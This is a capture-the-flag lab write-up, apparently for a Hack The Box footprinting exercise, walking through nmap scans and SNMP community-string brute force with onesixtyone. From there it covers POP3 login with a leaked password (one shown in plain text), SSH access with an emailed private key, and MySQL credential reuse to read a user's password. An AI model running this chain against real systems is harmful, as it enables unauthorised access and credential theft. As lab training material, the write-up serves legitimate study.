# Summary 
- Enumerate MX server which has the function of backup server for the internal accounts in the domain.
- After getting access of internal server, try to find credentials of `HTB` user.

## Scanning

**command:**
`sudo nmap --top-ports 100 <target-ip> -oN Top100Ports.out`

**Output:**
┌──(kali㉿kali)-[~/Labs/Documentation/Footprinting/Hard_lab]
└─$ cat Top100Ports.out 
```Bash
Nmap 7.99 scan initiated Mon May 18 22:51:20 2026 as: /usr/lib/nmap/nmap --top-ports 100 -oN Top100Ports.out 10.129.202.20
Nmap scan report for 10.129.202.20
Host is up (0.15s latency).
Not shown: 95 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

# Nmap done at Mon May 18 22:51:21 2026 -- 1 IP address (1 host up) scanned in 1.41 seconds
```


Here We can see there are multiple ports are open, now lets try to enumerate these ports one by one and lets see what we can find.

Enumerating email handling services.

**Command:**
`sudo nmap -sV -sC -p 110,143,995,993 <target-ip> -oN EmailServices.out.nmap`

**Output:**
```Bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 23:10 -0400
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 23:10 (0:00:30 remaining)
Nmap scan report for 10.129.202.20
Host is up (0.16s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: RESP-CODES STLS USER TOP SASL(PLAIN) UIDL PIPELINING CAPA AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: have LITERAL+ more IDLE post-login ENABLE listed AUTH=PLAINA0001 Pre-login ID STARTTLS OK IMAP4rev1 LOGIN-REFERRALS SASL-IR capabilities
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: LITERAL+ more IDLE have ENABLE post-login AUTH=PLAINA0001 Pre-login listed ID OK IMAP4rev1 LOGIN-REFERRALS SASL-IR capabilities
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE UIDL PIPELINING CAPA TOP
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
```

now ,
After doing everything on these port i found out that we cant do anything using these ports because we need credentials to use these services, then we can try scanning `UDP` ports.

**Command:**
`Sudo nmap -sU --top-ports <target-ip>`

**Output:**
```Bash
# Nmap 7.99 scan initiated Mon May 18 22:51:43 2026 as: /usr/lib/nmap/nmap --top-ports 100 -oN Top100UdpPorts.out -sU 10.129.202.20
Nmap scan report for 10.129.202.20
Host is up (0.15s latency).
Not shown: 87 closed udp ports (port-unreach)
PORT      STATE         SERVICE
19/udp    open|filtered chargen
49/udp    open|filtered tacacs
68/udp    open|filtered dhcpc
161/udp   open          snmp
443/udp   open|filtered https
518/udp   open|filtered ntalk
1433/udp  open|filtered ms-sql-s
1812/udp  open|filtered radius
1813/udp  open|filtered radacct
5060/udp  open|filtered sip
49152/udp open|filtered unknown
49182/udp open|filtered unknown
49201/udp open|filtered unknown

# Nmap done at Mon May 18 22:53:12 2026 -- 1 IP address (1 host up) scanned in 88.74 seconds
```

Here we can see that there is one ports which is open SNMP, now we can Scan this port and try to find out something interesting.

**Command:**
`sudo nmap -sV -sC -p 161 -sU <target-ip> -Pn --disable-arp-ping -n`

**Output:**
```Bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 23:30 -0400
Nmap scan report for 10.129.202.20
Host is up (0.16s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 43m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.49 seconds
```

## Enumeration:

Now here i am trying to access SNMP using `snmpwalk` tool with default community strings like
- public
- private
- manager
- admin
Although when we scan SNMP we found out that SNMP is using version 3 but we are trying version 2 because version 2 is weak and on that server SNMP maybe running on version 2.

**Command:**
`snmpwalk -v2c -c public <target-ip>`

**Output:**
`Timeout: No Response from 10.129.202.20`
We are getting only this output using default community strings.

Now lets try to brute force community string using tool `onesixtyone` with wordlist from `seclist` 
`/discovery/snmp.txt`

**Command:**
`onesixtyone -c ./wordlist/snmp.txt <target-ip>`

**Output:**
```Bash
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```
Here we found out that community string is `backup`, now lets use `snmpwalk` using this string.

**command:**
`snmpwalk -v2c -c backup <target-ip>`

**Output:**
```Bash
<snip>
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 165
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.1.0 = INTEGER: 1
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.2.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): STRING: "/opt/tom-recovery.sh"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.3.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): STRING: "tom <redacted>"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.4.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): ""
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.3.1.1.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.3.1.2.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.4.1.2.6.66.65.67.75.85.80.1 = Wrong Type (should be INTEGER): STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.4.1.2.6.66.65.67.75.85.80.2 = Wrong Type (should be INTEGER): STRING: "Authentication token manipulation error"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.4.1.2.6.66.65.67.75.85.80.3 = Wrong Type (should be INTEGER): STRING: "chpasswd: (line 1, user tom) password not changed"
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.4.1.2.6.66.65.67.75.85.80.4 = Wrong Type (should be INTEGER): STRING: "Changing password for tom."
HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
<snip>
```

In this specific line we can see:
`HOST-RESOURCES-MIB::hrSystemMaxProcesses.1.2.1.3.6.66.65.67.75.85.80 = Wrong Type (should be INTEGER): STRING: "tom <redacted>"`
a name tom and maybe a password of this user, now lets try this credentials on ssh servic.

**Command:**
`ssh tom@<target-ip> -o PreferredAuthentications=password`

**Output:**
```Bash
The authenticity of host '10.129.119.193 (10.129.119.193)' can't be established.
ED25519 key fingerprint is: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.119.193' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@10.129.119.193: Permission denied (publickey).
```

Here we cant use password of authentication.

Now lets try in credential in pop3 service on port 110 using `netcat`

**Command:**
`nc <target-ip> 110`

**Output:**
```Bash
+OK Dovecot (Ubuntu) ready.
user tom
+OK
pass NMds732Js2761     
+OK Logged in.
```

We logged in successfully that means the credential we found using `snmpwalk` during SNMP enumeration is worked.

now we have to find something interesting in pop3 server.
```Bash
list
+OK 1 messages:
1 3661
.
retr 1
+OK 3661 octets
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
<redacted>
-----END OPENSSH PRIVATE KEY-----
```


Here we successfully found out a  private key for `ssh` where we can use this key try to authenticate ourself to `ssh` service.

Now lets try to login `ssh` using this key.

First copy key and save into a file named `id_rsa` then change its permission only where owner/user have read write permission to that file.

**Commands:**
```Bash
chmod 600 id_rsa
ssh -i ./id_rsa tom@<target-ip>
```

**Output:**
```Bash
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 19 May 2026 05:40:43 AM UTC

  System load:  0.0               Processes:               182
  Usage of /:   67.0% of 5.70GB   Users logged in:         0
  Memory usage: 31%               IPv4 address for ens192: 10.129.119.193
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$ 
```

And here also we successfully get remote access of host machine.

Now we can check all the files and directories for the password of username HTB.

After checking all the file but we didn't get anything.
So we can check which services running on tom's machine.

**Command:**
`systemctl list-units --type=service --state=running`

**Output:**
```Bash
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                                 
  accounts-daemon.service     loaded active running Accounts Service                                            
  atd.service                 loaded active running Deferred execution scheduler                                
  cron.service                loaded active running Regular background program processing daemon                
  dbus.service                loaded active running D-Bus System Message Bus                                    
  dovecot.service             loaded active running Dovecot IMAP/POP3 email server                              
  getty@tty1.service          loaded active running Getty on tty1                                               
  irqbalance.service          loaded active running irqbalance daemon                                           
  multipathd.service          loaded active running Device-Mapper Multipath Device Controller                   
  mysql.service               loaded active running MySQL Community Server                                      
  networkd-dispatcher.service loaded active running Dispatcher daemon for systemd-networkd                      
  open-vm-tools.service       loaded active running Service for virtual machines hosted on VMware               
  polkit.service              loaded active running Authorization Manager                                       
  rsyslog.service             loaded active running System Logging Service                                      
  snapd.service               loaded active running Snap Daemon                                                 
  snmpd.service               loaded active running Simple Network Management Protocol (SNMP) Daemon.           
  ssh.service                 loaded active running OpenBSD Secure Shell server                                 
  systemd-journald.service    loaded active running Journal Service                                             
  systemd-logind.service      loaded active running Login Service                                               
  systemd-networkd.service    loaded active running Network Service                                             
  systemd-resolved.service    loaded active running Network Name Resolution                                     
  systemd-timesyncd.service   loaded active running Network Time Synchronization                                
  systemd-udevd.service       loaded active running udev Kernel Device Manager                                  
  udisks2.service             loaded active running Disk Manager                                                
  unattended-upgrades.service loaded active running Unattended Upgrades Shutdown                                
  user@1002.service           loaded active running User Manager for UID 1002                                   
  vgauth.service              loaded active running Authentication service for virtual machines hosted on VMware

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

26 loaded units listed.
```

We can see here sql service is also running, earlier in medium lab we saw that HTB password is also stored in database, then lets check mysql with those credentials we found out during SNMP enumeration

**Command:**
`mysql -u tom -p `
**output:**

```Bash
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
Here also we successfully authenticate to `mysql` service and now lets check username HTB its password.

**Command:**
```Bash
mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.00 sec)

mysql> use users
Database changed

mysql> select username,password from users where username='HTB';
+----------+------------------------------+
| username | password                     |
+----------+------------------------------+
| HTB      | <redacted>                   |
+----------+------------------------------+
1 row in set (0.00 sec)
```

## Key Takeaways

- Weak SNMP community strings can expose sensitive operational data.
- POP3 services may contain sensitive authentication material.
- SSH private keys stored in emails represent a major security risk.
- Credential reuse enabled lateral movement into MySQL services.
- Service enumeration is critical during internal assessments.
